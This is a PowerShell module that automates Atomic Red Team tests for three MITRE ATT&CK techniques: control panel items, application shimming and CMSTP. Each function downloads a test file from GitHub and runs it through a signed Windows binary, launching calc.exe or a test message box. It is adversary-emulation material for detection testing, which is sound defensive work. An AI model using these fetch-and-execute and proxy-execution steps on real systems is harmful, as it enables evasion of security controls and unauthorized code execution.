<#

Name: Mitre Attack Matrix Test

Author: Daniel Hayes

Short Description: This module is used to run an automated test from Atomic Red Team's github found at:
https://github.com/redcanaryco/atomic-red-team

This goes through the attacks on the 'Replication through removable media Method'

1. Replication through Removable Media (No test contriuted in GitHub.)
2. Control Panel Items (Complete) - T1196
    -If successful it launches calc.exe
3. Application Shimming (Complete) - T1138 
    -If successful a window will pop up stating 'Atomic Shim DLL Test' 
4. CMSTP (Complete) - t1191
    -If successful calc.exe should launch. 
5. Credentials in Files
6. File and Discovery
7. Logon Scripts
8. Data from Local System (No test contributed in GitHub)
9. Exfiltration over alternative protocol 
10. Custom cryptographic protocol (No test contributed in GitHub)
11. Disk Content Wipe (No test contributed in GitHub)

#>

#https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1196/T1196.md
function Invoke-T1196{
    $CPLPath = "C:\Tools\T1196\"
    $CPLFullP = "C:\Tools\T1196\calc.cpl"
    New-Item -Type Directory  -Path $CPLPath -ErrorAction ignore | Out-Null
    Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1196/bin/calc.cpl" -OutFile $CPLFullP
    Start-Process control.exe -ArgumentList $CPLFullP
}

#https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1138/T1138.md
function Invoke-T1138 {
    $ShimDatabase = "C:\Tools\T1138\AtomicShimx86.sdb"
    $ShimDir = "C:\Tools\T1138\"
    $TestDLL = "C:\Tools\AtomicTest.dll" # Must be run from C:\Tools
    $TestExe = "C:\Tools\AtomicTest.exe" # Must be run from C:\Tools
    New-Item -Type Directory  -Path $ShimDir -ErrorAction ignore | Out-Null
    Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1138/bin/AtomicShimx86.sdb" -OutFile $ShimDatabase
    Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1138/bin/AtomicTest.dll" -OutFile $TestDLL
    Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1138/bin/AtomicTest.exe" -OutFile $TestExe
    Start-Process sdbinst.exe -ArgumentList $ShimDatabase
    Start-Process $TestExe
    # Start-Process sdbinst.exe -ArgumentList "-u C:\Tools\T1138\AtomicShimx86.sdb" ---Run this to remove.
}

#https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1191/T1191.md
function Invoke-T1191 {
    $PathInf = "C:\Tools\T1191\T1191.inf"
    $Path = "C:\Tools\T1191\"
    $Argument = "/s $PathInf"
    $UArgument = "/u /s $PathInf"
    New-Item -Type Directory  -Path $Path -ErrorAction ignore | Out-Null
    Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1191/src/T1191.inf" -OutFile $PathInf
    Start-Process cmstp.exe -ArgumentList $Argument
    #Start-Process cmstp.exe -ArgumentList $UArgument ---Run this to remove. 
}